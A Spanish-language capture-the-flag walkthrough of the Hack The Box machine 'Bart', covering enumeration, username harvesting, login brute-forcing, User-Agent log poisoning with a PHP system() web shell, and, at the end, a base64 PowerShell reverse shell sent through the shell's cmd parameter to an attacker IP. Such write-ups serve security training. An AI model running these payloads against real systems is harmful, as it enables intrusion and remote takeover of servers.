<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Bart</title></head><body><article id="58ca167d-a11c-417c-8d0f-64d2c60a4dbe" class="page sans"><header><h1 class="page-title">Bart</h1></header><div class="page-body"><h3 id="b5b828b5-a17c-4a06-b935-78c230065be2" class="">Reconocimiento</h3><p id="b4f49e97-033d-40ef-9848-4cb7f3f7bcaa" class="">
</p><pre id="78916ee9-8283-4e4d-b0d6-b11caf1a7142" class="code"><code>┌─[root@parrot]─[/mnt/angussMoody/Machines/Bart]
└──╼ #catn nmap 
# Nmap 7.91 scan initiated Mon Jun 21 18:02:22 2021 as: nmap -sC -sV -p80 -o nmap 10.129.165.76
Nmap scan report for 10.129.165.76
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://forum.bart.htb/
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 21 18:02:35 2021 -- 1 IP address (1 host up) scanned in 13.44 seconds</code></pre><p id="e218147c-52ff-4329-aeac-406f3735f315" class="">
</p><h3 id="6a0979fc-0105-47f1-976a-2e036a8605b7" class="">Vemos que tiene un servicio web y al tratar de consumirlo nos redirige a <a href="http://forum.bart.htb/">http://forum.bart.htb/</a> </h3><p id="35bcacbc-c01a-4f5f-9a6f-bf323fcb6628" class="">
</p><figure id="9c27c65c-8f1f-4ee5-ba34-8a4867094b39" class="image"><a href="Bart/images/1.png"><img style="width:912px" src="Bart/images/1.png"/></a></figure><p id="81bbd6ee-4c14-4cb9-bc1a-d02ba24b45ed" class="">
</p><h3 id="96d80902-3098-4840-9331-d602e7ed45c5" class="">Así que lo agregamos a nuestro /etc/hosts </h3><p id="1c0d8dfa-8271-477b-8a6a-c80803037f55" class="">
</p><pre id="6382f8cf-e3ec-415f-b3bf-a370c154d1b9" class="code"><code>┌─[root@parrot]─[/mnt/angussMoody/Machines/Bart]
└──╼ #catn /etc/hosts
127.0.0.1	localhost
127.0.1.1	parrot

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

10.129.218.109	forum.bart.htb</code></pre><p id="187142b8-4bbd-4a13-9f52-fa8b12bb8f7a" class="">
</p><h3 id="33181f8c-13e5-4c14-846e-4abbf4923a26" class="">Y así vemos una web</h3><p id="219c1d87-6a9f-4c96-955f-d25f93fe74b0" class="">
</p><figure id="57538469-f0a0-4945-a655-7728bbb3e048" class="image"><a href="Bart/images/2.png"><img style="width:1056px" src="Bart/images/2.png"/></a></figure><p id="cc4e8b60-2765-4ea8-bdb7-c0b85b8b903f" class="">
</p><h3 id="052d0089-1809-4280-bf3f-08145e7e94de" class="">Enumeraremos un poco con whatweb para ver si nos da algo que pueda ser interesante y este nos devuelve unos Email y nos dice que es un IIS 10.0</h3><p id="bb26f5c8-e5c1-4122-bbbf-0df65d919cb2" class="">
</p><pre id="ade35080-5727-4eb5-84d0-af6422e436b4" class="code"><code>─[root@parrot]─[/mnt/angussMoody/Machines/Bart]
└──╼ #whatweb http://forum.bart.htb/
http://forum.bart.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[d.simmons@bart.htb,h.potter@bart.htb,info@bart.htb,r.hilton@bart.htb,s.brown@bart.loca,s.brown@bart.local], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.129.218.109], JQuery, MetaGenerator[WordPress 4.8.2], Microsoft-IIS[10.0], PoweredBy[WordPress], Script[text/javascript], Title[BART], WordPress[4.8.2]</code></pre><p id="adcb3dc6-1b8e-4dc7-ab97-bbac7e27abe7" class="">
</p><h3 id="5f9af8b9-cb9f-449c-bb6b-4de0db009136" class="">Vamos a Enumerar un poco la web para ver con que nos encontramos y vemos posibles Usuarios que habíamos visto con el whatweb</h3><p id="a0639420-c7fc-49cf-83c9-d74482939584" class="">
</p><figure id="cb5d3ac4-352a-48c7-9fe7-1a5a203d246a" class="image"><a href="Bart/images/3.png"><img style="width:1200px" src="Bart/images/3.png"/></a></figure><p id="46ca6348-a032-43d7-a0aa-e5c9d0e23648" class="">
</p><h3 id="81031dca-4619-48f2-9aaf-117d169891d3" class="">Como vemos que tiene sub dominios vamos a realizar una búsqueda de estos con la herramienta wfuzz y vemos que nos devuelve un estado de 200 con el subdominio monito </h3><p id="abe27ab2-7c82-4189-9296-d26c6eb78d36" class="">
</p><pre id="c80ebe47-f311-4771-a83a-81a6b2231f58" class="code"><code>┌─[root@parrot]─[/mnt/angussMoody/Machines/Bart]
└──╼ #wfuzz -c --hc=404 --hl=0,6 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H &quot;HOST: FUZZ.bart.htb&quot; http://bart.htb/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://bart.htb/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                   
=====================================================================

000000067:   200        548 L    2412 W     35529 Ch    &quot;forum - forum&quot;                                                                                                           
000001614:   200        80 L     221 W      3423 Ch     &quot;monitor - monitor&quot;                                                                                                       
000002385:   200        548 L    2412 W     35529 Ch    &quot;Forum - Forum&quot;                                                                                                           
000019837:   200        80 L     221 W      3423 Ch     &quot;Monitor - Monitor&quot;                                                                                                       
000217693:   200        80 L     221 W      3423 Ch     &quot;MONITOR - MONITOR&quot;                                                                                                       

Total time: 263.3295
Processed Requests: 220560
Filtered Requests: 220555
Requests/sec.: 837.5817</code></pre><p id="2f51ca50-a80e-48ff-9632-e3e1239486c6" class="">
</p><h3 id="98fdd6a9-e92a-4550-9b09-078e7fdb20f0" class="">Vemos que los usuarios los está llamando desde un mailto: así que vamos a hacer un grep para que me extraiga todos los usuarios con los que cuenta</h3><p id="3e29a835-b749-4c69-8064-9a12635f2677" class="">
</p><figure id="8c759555-3cdf-41e3-8bec-12b01fb9ea70" class="image"><a href="Bart/images/4.png"><img style="width:1104px" src="Bart/images/4.png"/></a></figure><p id="0b4332da-66aa-4233-afff-560a28c63020" class="">
</p><pre id="b1f320ce-209c-4f3e-85d7-642f240c85c7" class="code"><code>┌─[root@parrot]─[/mnt/angussMoody/Machines/Bart]
└──╼ #curl -s http://forum.bart.htb | grep mailto | cut -d &quot; &quot; -f 3 | cut -d &quot;\&quot;&quot; -f 2 | cut -d &quot;:&quot; -f 2 | grep -v &quot;widget&quot; &gt; users.txt
┌─[root@parrot]─[/mnt/angussMoody/Machines/Bart]
└──╼ #catn users.txt 
s.brown@bart.local
d.simmons@bart.htb
r.hilton@bart.htb
h.potter@bart.htb
┌─[root@parrot]─[/mnt/angussMoody/Machines/Bart]
└──╼ #</code></pre><p id="232133fa-ef04-4c76-a406-a5dc68b5a53a" class="">
</p><h3 id="643b5b23-3c96-4bd3-8589-cf7955185182" class="">Dentro de <a href="http://monitor.bart.htb/">http://monitor.bart.htb/</a> nos encontramos con un formulario de inicio de sesión y con la versión del PHP Server Monito que es la V3.2.1</h3><p id="3848ca0c-f0b2-45e6-8216-2694c7b14781" class="">
</p><figure id="edba283b-3860-4d8d-89da-0ee31056c17a" class="image"><a href="Bart/images/5.png"><img style="width:1008px" src="Bart/images/5.png"/></a></figure><p id="0e9eb469-2f33-4098-858d-0d48fb0a7cf3" class="">
</p><h3 id="c11cd49c-140f-4357-9428-926308e49c8b" class="">Vamos a realizar un ataque de Fuerza bruta  con los Usuarios que tenemos </h3><p id="c0ef7c84-430b-46f5-b7d8-af292d963773" class="">
</p><figure id="eaf86a12-15d2-4121-b9f3-abb27285c1c8" class="image"><a href="Bart/images/6.png"><img style="width:1104px" src="Bart/images/6.png"/></a></figure><p id="4f8279b1-4885-47bc-a8b5-c5b8c6013b87" class="">
</p><h3 id="14b942f9-5614-4c6e-bb4c-bb89a6ea8fb5" class="">Vemos que podemos tratar de recuperar contraseña así que vamos a probar si podemos realizar una enumeración de usuarios de esta manera</h3><p id="eb2c9de9-9ced-4177-b58c-f64b3396db22" class="">
</p><figure id="1753b92f-d29a-4f43-9a46-0bee5f559d11" class="image"><a href="Bart/images/8.png"><img style="width:1008px" src="Bart/images/8.png"/></a></figure><p id="ac28de17-ac67-4eee-8a4b-e6ab1776f5ee" class="">
</p><h3 id="c269481b-abff-4c2c-84c0-0adad3016419" class="">Completamos un poco más nuestro archivo de usuarios para realizar un ataque de fuerza bruta</h3><p id="228d0fc7-aa96-4aae-bda6-575650d35aa5" class="">
</p><pre id="bb7ab935-ac92-4973-b1de-c5d2132c0d5e" class="code"><code>┌─[root@parrot]─[/mnt/angussMoody/Machines/Bart]
└──╼ #cat users.txt 
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: users.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ s.brown@bart.local
   2   │ d.simmons@bart.htb
   3   │ r.hilton@bart.htb
   4   │ h.potter
   5   │ s.brown
   6   │ d.simmons
   7   │ r.hilton
   8   │ h.potter
   9   │ Samantha Brown
  10   │ SamanthaBrown
  11   │ Samantha
  12   │ Brown
  13   │ Daniel Simmons
  14   │ DanielSimmons
  15   │ Daniel
  16   │ Simmons
  17   │ Robert Hilton
  18   │ RobertHilton
  19   │ Robert
  20   │ Hilton
  21   │ Harvey Potter
  22   │ HarveyPotter
  23   │ Harvey
  24   │ Potter
  25   │ samantha brown
  26   │ samanthabrown
  27   │ samantha
  28   │ brown
  29   │ daniel simmons
  30   │ danielsimmons
  31   │ daniel
  32   │ simmons
  33   │ robert hilton
  34   │ roberthilton
  35   │ robert
  36   │ hilton
  37   │ harvey potter
  38   │ harveypotter
  39   │ harvey
  40   │ potter
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</code></pre><p id="b3f105c9-dcd1-448e-b812-e7a546ce7fb4" class="">
</p><h3 id="e8e83fdb-2980-4f02-9f02-8924b9017b6f" class="">Vemos que con Daniel y con Harvey obtenemos un resultado diferente que con los otros</h3><p id="31389719-e219-49a0-8e1e-5d6f9b29a4c9" class="">
</p><figure id="cfaeb6a2-ad20-4eaa-8b12-e953d508f59f" class="image"><a href="Bart/images/9.png"><img style="width:1104px" src="Bart/images/9.png"/></a></figure><p id="8053b7ff-ae1d-43b6-ae45-0f229a51e938" class="">
</p><h3 id="eb7d90fb-6a2c-4146-aaa9-9887ecd948bc" class="">Realizamos la prueba manuel y vemos que estos usuarios si existen </h3><p id="affd11cb-7a76-4ac4-8c64-15d09fa19c09" class="">
</p><div id="14e044fe-60a9-497f-8ce1-b4ff1ff4f62c" class="column-list"><div id="600a21fe-6d08-4d27-9c53-383884a247f5" style="width:50%" class="column"><figure id="674aea54-692c-4d04-94a0-824351045566" class="image"><a href="Bart/images/10.png"><img style="width:624px" src="Bart/images/10.png"/></a></figure></div><div id="9efd4f05-2a24-405f-9e35-a0feaf4f9af9" style="width:50%" class="column"><figure id="4d892356-3033-483a-b825-ef2493592f5a" class="image"><a href="Bart/images/11.png"><img style="width:624px" src="Bart/images/11.png"/></a></figure><p id="525dec9e-e83e-40d7-920c-dfd1284771c2" class="">
</p></div></div><h3 id="061016b6-8499-480b-9c10-9958fd6679fe" class="">Ahora vamos a realizar una fuerza Bruta con estos Usuarios</h3><p id="52196aa8-d722-485c-abe4-060b7fa90041" class="">
</p><figure id="45a2a81e-e182-420a-bbf3-26a4b8509f94" class="image"><a href="Bart/images/12.png"><img style="width:1104px" src="Bart/images/12.png"/></a></figure><p id="12be2254-8c30-44fd-a726-093719668a33" class="">
</p><h3 id="6dc39146-4a10-4a12-a2ab-a999f79448ac" class="">Después de realizar el ataque con Daniel y la lista de Usuarios que tenemos como contraseña no obtuvimos resultados, pero con Harvey si tenemos un resultado con la palabra potter como contraseña </h3><p id="3514539f-85d9-4b6a-839b-f28e57b717c3" class="">
</p><figure id="92b21e2d-87ce-4532-ba4e-ee25982cf6cc" class="image"><a href="Bart/images/13.png"><img style="width:1104px" src="Bart/images/13.png"/></a></figure><p id="9b66c7b8-ee9c-4a59-a3b8-09673a61299f" class="">
</p><h3 id="f5a6c00e-551b-4333-a53f-d4944bcd0e51" class="">De esta manera logramos acceso y vemos que tiene un link que nos manda a SERVER MONITOR</h3><p id="cbcadc66-7164-4a33-b0f3-0106e07f800b" class="">
</p><figure id="422ebe3b-e101-4cdb-8cf8-0bc276eab469" class="image"><a href="Bart/images/14.png"><img style="width:912px" src="Bart/images/14.png"/></a></figure><p id="799c9c5f-f9e2-4f99-9a6f-ab314d8bc36e" class="">
</p><h3 id="4913b6fc-23d1-46f6-9218-5c99c459dd59" class="">Nos dirigimos a este link y vemos que nos lleva a una interfaz con un menú que debemos enumerar </h3><p id="e05b092a-0591-46ae-a40e-5156eb1aa2f3" class="">
</p><figure id="423e2552-9309-4330-aaf9-cc0a94a7dfdb" class="image"><a href="Bart/images/15.png"><img style="width:1008px" src="Bart/images/15.png"/></a></figure><p id="03690fe7-2ae5-4c61-b9dd-fb183256156b" class="">
</p><h3 id="47328099-56cf-4bb5-b756-5015c44adcae" class="">Enumerando, nos encontramos con cosas que nos llaman la atención como que en la Url está haciendo una llamada a una variable y nos muestra un nuevo subdominio, así que ponemos este en nuestro /etc/hosts </h3><p id="71798df3-18ea-4544-ad2d-5b0547e27e55" class="">
</p><figure id="ba8f5b51-9d6c-4d30-967a-3e58032d1988" class="image"><a href="Bart/images/16.png"><img style="width:1056px" src="Bart/images/16.png"/></a></figure><p id="28fe4c8a-07b8-4f15-8b64-a29aaab421e7" class="">
</p><h3 id="c51b7f1f-5e9d-4e81-9d90-47293d4de31d" class="">Este subdominio nos lleva  a otro login con un formulario para iniciar sesión al parecer de un chat </h3><p id="ca250845-7c71-46b6-9bab-a2f14e1af83e" class="">
</p><figure id="7f22f567-2805-4f88-bbf4-8820f16c3a7a" class="image"><a href="Bart/images/17.png"><img style="width:1056px" src="Bart/images/17.png"/></a></figure><p id="75e4a8c8-520c-4e63-97f4-555f68b7884c" class="">
</p><h3 id="12d699f8-252c-4336-ad14-3432a3822678" class="">Después de intentar hacer fuerza bruta a este login, pasamos a Buscar el código fuente de este servicio <mark class="highlight-red"><a href="https://github.com/magkopian/php-ajax-simple-chat/tree/master/simple_chat">https://github.com/magkopian/php-ajax-simple-chat/tree/master/simple_chat</a></mark><mark class="highlight-red"> </mark>donde vemos varios archivos, entre ellos uno llamado registrer.php</h3><p id="d1b6a832-2160-4875-80bb-2e6c317f118d" class="">
</p><figure id="4424ceb7-95bf-47c7-9968-8daf844df52f" class="image"><a href="Bart/images/18.png"><img style="width:1104px" src="Bart/images/18.png"/></a></figure><pre id="6629678b-864c-493a-ae70-4cdba8118134" class="code"><code>&lt;?php
/**********************************************\
* Copyright (c) 2013 Manolis Agkopian          *
* See the file LICENCE for copying permission. *
\**********************************************/

session_start();
define(&#x27;INCLUDED&#x27;,true);
require &#x27;includes/core_func.php&#x27;;
require &#x27;includes/validation_func.php&#x27;;

if (user_logged_in()) {
	header(&#x27;Location: ../&#x27;);
	die();
}

$errors = array();

//check if username is provided
if (!isset($_POST[&#x27;uname&#x27;]) || empty($_POST[&#x27;uname&#x27;])) {
	$errors[&#x27;uname&#x27;] = &#x27;The Username is required&#x27;;
} else {
	//validate username
	if (($uname = validate_username($_POST[&#x27;uname&#x27;])) === false) {
		$errors[&#x27;uname&#x27;] = &#x27;The Username is invalid&#x27;;
	}
}

//check if password is provided
if (!isset($_POST[&#x27;passwd&#x27;]) || empty($_POST[&#x27;passwd&#x27;])) {
	$errors[&#x27;passwd&#x27;] = &#x27;The Password is required&#x27;;
} else {
	//validate password
	
	if (($passwd = validate_password($_POST[&#x27;passwd&#x27;])) === false) {
		$errors[&#x27;passwd&#x27;] = &#x27;The Password must be at least 8 characters&#x27;;
	}
}

//check if recaptcha is provided
if (!isset($_POST[&#x27;recaptcha_challenge_field&#x27;]) || empty($_POST[&#x27;recaptcha_challenge_field&#x27;]) || 
	!isset($_POST[&#x27;recaptcha_response_field&#x27;]) || empty($_POST[&#x27;recaptcha_response_field&#x27;])) {
	$errors[&#x27;recaptcha&#x27;] = &#x27;The reCAPTCHA is required&#x27;;
}
else {
	//validate recaptcha
	if (validate_recaptcha($_POST[&#x27;recaptcha_challenge_field&#x27;], $_POST[&#x27;recaptcha_response_field&#x27;]) === false) {
		$errors[&#x27;recaptcha&#x27;] = &#x27;The reCAPTCHA wasn\&#x27;t entered correctly.&#x27;;
	}		
}


//check for form field errors
if (!empty($errors)) { //if there are any errors
	$_SESSION[&#x27;reg_errors&#x27;] = $errors; //set a session variable to pass them to the registration form page
}
else { //if no errors try to register
	if (($res = register($uname, $passwd)) === false) { //if database error
		$errors[&#x27;uname&#x27;] = &#x27;An error has been occurred&#x27;; //we want it to appear above username field
		$_SESSION[&#x27;reg_errors&#x27;] = $errors; //set a session variable to pass them to the registration form page
	}
	else if ($res === -1) { //if user already exists	
		$errors[&#x27;uname&#x27;] = &#x27;Username already exists&#x27;; //we want it to appear above username field
		$_SESSION[&#x27;reg_errors&#x27;] = $errors; //set a session variable to pass them to the registration form page
	}
	else {
		if (get_last_page() !== false) {
			header(&#x27;Location: login_form.php?ref=reg&#x27;); //after sucessful register goto the login page
			die();
		}
		else {
			header(&#x27;Location: ../&#x27;); //you can replace this redirect with one to the chat page of your site if you want
			die();
		}
	}
}

//else redirect to the registration form of the site
header(&#x27;Location: register_form.php&#x27;); //you can replace this redirect with one to the chat page of your site
die();
?&gt;</code></pre><p id="d53dea09-c585-4f2f-9116-aca2db9fe7ff" class="">
</p><h3 id="07f9d58e-fd44-4824-ae9b-0cb2c5fb3d72" class="">Aunque no podemos ver este archivo por medio de la web, podríamos tratar de hacerlo por medio de curl</h3><p id="7332ed15-f8e4-439b-b5e7-5a54613fce9b" class="">
</p><figure id="5d4711d2-b2a9-4086-b3f5-3ad00d0a71eb" class="image"><a href="Bart/images/19.png"><img style="width:1008px" src="Bart/images/19.png"/></a></figure><p id="2f34b1e7-cfa5-4453-8974-2b6a0198507c" class="">
</p><pre id="b6baecf2-3d06-4636-8019-48ae73572039" class="code"><code>┌─[✗]─[root@parrot]─[/mnt/angussMoody/Machines/Bart]
└──╼ #curl -s -X POST -d &quot;uname=angussmoody&amp;passwd=anguss123&quot; &quot;http://internal-01.bart.htb/simple_chat/register.php&quot; --proxy http://127.0.0.1:8080</code></pre><p id="9ea31b68-81f2-4ae2-8fb9-feb4c96e4e82" class="">
</p><h3 id="b8ee0853-e670-4452-9853-2c91f639a28f" class="">Podemos ingresar con el usuario creado</h3><p id="b262e84b-e3a6-4648-9510-ab7eb33ec9e0" class="">
</p><figure id="f0b4bae0-a76d-451b-ae56-286bab92578d" class="image"><a href="Bart/images/20.png"><img style="width:1152px" src="Bart/images/20.png"/></a></figure><p id="ffc49a75-9efe-4487-a46f-56c6fcefd011" class="">
</p><h3 id="6ccac79e-9f74-4a6c-b3c3-d080b1bf41ba" class="">Vemos unos usuarios, pero hasta ahora nada interesante, así que pasamos a ver el código fuente de la página para ver con que nos encontramos </h3><p id="7c2e78ff-ba41-490b-8c7f-47c697f56404" class="">
</p><p id="0bf0b7d2-a51a-44f1-b40e-d2c09e7de431" class="">
</p><figure id="29fe4998-5203-41de-8bad-52562beabc19" class="image"><a href="Bart/images/21.png"><img style="width:1152px" src="Bart/images/21.png"/></a></figure><h3 id="78d3074e-b1ec-47ae-a46a-c3851d1dfe1f" class="">nos encontramos con una página <mark class="highlight-red"><a href="http://internal-01.bart.htb/log/log.php?filename=log.txt&amp;username=harvey">http://internal-01.bart.htb/log/log.php?filename=log.txt&amp;username=harvey</a></mark>  así que vamos a revisar que nos encontramos</h3><p id="10e94a80-e724-4d40-ba62-d78274f445d2" class="">
</p><figure id="1c276e6d-2a0d-49cd-a012-9f33bc7370dd" class="image"><a href="Bart/images/22.png"><img style="width:1152px" src="Bart/images/22.png"/></a></figure><p id="b6c186ce-f0f0-4197-a4df-4be09a5c15bb" class="">
</p><h3 id="79198cd6-f985-460d-be2e-e88d71bb3c39" class="">Este nos devuelve un 1, debemos entender un poco lo que está haciendo y tenemos 2 parámetros, donde uno de ellos es el Usuario, pero vemos que cuando ponemos un usuario que no existe nos devuelve un 0</h3><p id="4bbf5fbc-6bd3-4813-8cf8-653a3e0f6da1" class="">
</p><figure id="6b855b82-95b2-4961-a719-783451238a71" class="image"><a href="Bart/images/23.png"><img style="width:1200px" src="Bart/images/23.png"/></a></figure><p id="e1c00aa0-db54-4578-9bff-812a003f6512" class="">
</p><h3 id="5f1ec23d-5907-47fa-a699-1b30bc8b39a6" class="">Vemos que pasa si le quitamos la variable del usuario y esto nos manda un error con la ruta del archivo</h3><p id="1bf1b817-4682-4b64-93bc-46193361d093" class="">
</p><figure id="d8101cba-c304-4ad5-8923-109117e4b834" class="image"><a href="Bart/images/24.png"><img style="width:1152px" src="Bart/images/24.png"/></a></figure><p id="45156200-5242-4828-939a-105af179748c" class="">
</p><p id="6b43f622-d6da-4002-82f4-1747deba0fba" class="">
</p><h3 id="b7955d62-fbb7-42f9-a271-baa9bc4ecec4" class="">Ahora vamos a ver que pasa si enviamos solo el archivo y vemos que este nos está devolviendo unos datos</h3><p id="afc1d4f6-19d6-4f06-abcc-b57c60445395" class="">
</p><figure id="d90cee89-b3af-46aa-893f-5e5d5ad4ba9d" class="image"><a href="Bart/images/25.png"><img style="width:1200px" src="Bart/images/25.png"/></a></figure><p id="7069e0a5-02e5-4655-bf50-c5b133733203" class="">
</p><h3 id="dd15dc17-833f-40cf-81cd-532d240486aa" class="">Vamos a realizar unas pruebas consultando de nuevo con las variables y ver que cambios tiene </h3><figure id="ea09dae6-cdfe-4771-b3be-24a04cd296bd" class="image"><a href="Bart/images/26.png"><img style="width:1200px" src="Bart/images/26.png"/></a></figure><p id="da291f32-a7e7-42d9-97e2-5caa5937ba84" class="">
</p><h3 id="ddb9f61f-3a1e-4ac4-ad00-ea5e80bf6d97" class="">Y vemos que este nos trae unos datos de las consultas que hemos realizado,  nos trae una fecha, hora, El usuario Valido y ademas el User-Agent </h3><p id="4c8b3f33-a4e2-4a15-af23-d65b77b36ebd" class="">
</p><figure id="947b9f9f-46eb-4cfd-9045-9c8eb9329003" class="image"><a href="Bart/images/27.png"><img style="width:1200px" src="Bart/images/27.png"/></a></figure><p id="a02c6aa9-9bc8-4045-afe9-d3dec898e708" class="">
</p><p id="1fe08fc4-fe9c-43dc-85d7-c3347d5224c9" class="">
</p><h3 id="7488f317-fc24-4b35-b080-70b560e8b984" class="">Sabiendo esto ahora debemos tratar de Modificar el User-Agent para ver si nos responde con algo diferente, vamos a tratar de envía un código en php </h3><p id="45b7bec6-33e7-4c23-8cda-af5a69304c57" class="">
</p><pre id="0ee592c9-4ec2-47ab-8752-b33d3b783d3d" class="code"><code>&lt;?php system(&quot;whoami&quot;)?&gt;</code></pre><p id="43848845-6dfe-44e2-a49d-40ce6b35c426" class="">
</p><h3 id="e177fc1d-5958-4756-924f-dfc6c15aa60a" class="">Y vemos que si lo modifica, pero no lo puede interpretar, así que debemos encontrar una manera para que nos interprete el código</h3><p id="95076183-919d-4870-9392-90f095602b3e" class="">
</p><figure id="a9467295-d402-402f-81d5-0f09a667bcd2" class="image"><a href="Bart/images/28.png"><img style="width:1200px" src="Bart/images/28.png"/></a></figure><p id="c535a60e-0d62-4f2b-93cf-79a97653abdf" class="">
</p><h3 id="07e1dce5-5670-449f-86db-9d2903fd9639" class="">Sabemos que podemos tratar de realizar un ataque Log Poinsoning  <mark class="highlight-red"><a href="https://www.hackingarticles.in/apache-log-poisoning-through-lfi/">https://www.hackingarticles.in/apache-log-poisoning-through-lfi/</a></mark> y en este articulo podemos entender un poco de la forma de realizar el ataque, trataremos de modificar el archivo y enviar el mismo código php, vemos que podemos crear el archivo y también que nos envía el User-Agent modificado, pero al ser un archivo .txt no no lo interpreta, así que vamos a ver si podemos crear como un archivo con la extensión .php </h3><p id="40d172f4-be1b-4daf-bed1-c8993b752ad8" class=""> </p><figure id="c367902e-e4f5-4bd4-b401-ae5e0c3ae6b9" class="image"><a href="Bart/images/29.png"><img style="width:1200px" src="Bart/images/29.png"/></a></figure><p id="410fb928-1ffd-4857-82ea-37ba8d4cc4e4" class="">
</p><h3 id="b380c451-9f64-4017-8652-fa9d0b3d160a" class="">Vemos que de esta manera ya nos interpreta el código en php que enviamos </h3><p id="fbaf54f8-1428-4928-8f0b-762a94730b2d" class="">
</p><figure id="97b71b4f-aeee-4bbd-aeeb-15170b5441b4" class="image"><a href="Bart/images/30.png"><img style="width:1248px" src="Bart/images/30.png"/></a></figure><p id="05e23848-89d9-40a2-b5f4-11ddc99c538c" class="">
</p><h3 id="875906c5-44ee-4e05-8792-bc031087ded9" class="">Ahora vamos a tratar de crear una variable para que podamos ir enviando comandos en esta</h3><p id="7124c8bf-f9d6-40e0-a217-e938e538f373" class="">
</p><pre id="0be2d226-eb20-45e5-9a26-61b111a2ee9a" class="code"><code>┌─[root@parrot]─[/mnt/angussMoody/Machines/Bart]
└──╼ #cat ../../Shell/cmd.php 
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: ../../Shell/cmd.php
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ &lt;?php system($_GET[&#x27;cmd&#x27;])?&gt;</code></pre><p id="51c966ca-e805-49ce-b398-c2262a1d6a50" class="">
</p><h3 id="19decec7-1f2e-448a-8bb8-555f06950552" class="">Vemos que de este manera ya podemos utilizar comandos en esta variable, vamos a ver la información del sistema y con esto vemos que es un sistema de 64 bits, ahora debemos buscar una manera de tener una Reverse Shell</h3><p id="6b9252b4-d095-45a7-a9a9-9508a4d91e02" class="">
</p><figure id="df490ebd-3b7d-461d-a4c9-6cf163d7ddcf" class="image"><a href="Bart/images/32.png"><img style="width:912px" src="Bart/images/32.png"/></a></figure><p id="9dd0de24-9959-4d95-b9e6-804120e73a52" class="">
</p><h3 id="8851fb01-236a-4d40-99be-5363aebc1276" class="">Cómo sabemos ya que podemos ejecutar comandos vamos a ir  a esta web <mark class="highlight-red"><a href="https://www.revshells.com/">https://www.revshells.com/</a></mark><mark class="highlight-red"> </mark>que nos permite crear varios tipos de Reverse shell, para este caso vamos a hacer uso de la Powershell #3 (Base64)</h3><p id="4b1d5319-ddfa-40aa-a47e-0e28862b7b5f" class="">
</p><figure id="7661756a-20b8-4db0-87f3-14a0d4e77c5b" class="image"><a href="Bart/images/33.png"><img style="width:1104px" src="Bart/images/33.png"/></a></figure><p id="d0123901-2f1c-4069-8882-83138bdc7e52" class="">
</p><p id="31fd980e-9f08-4e63-91a9-016ea335e126" class="">
</p><pre id="a8da1928-90cc-4d8a-9d16-1799a6b27b56" class="code"><code>view-source:http://internal-01.bart.htb/log/test.php?cmd=powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA0ADUAIgAsADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=</code></p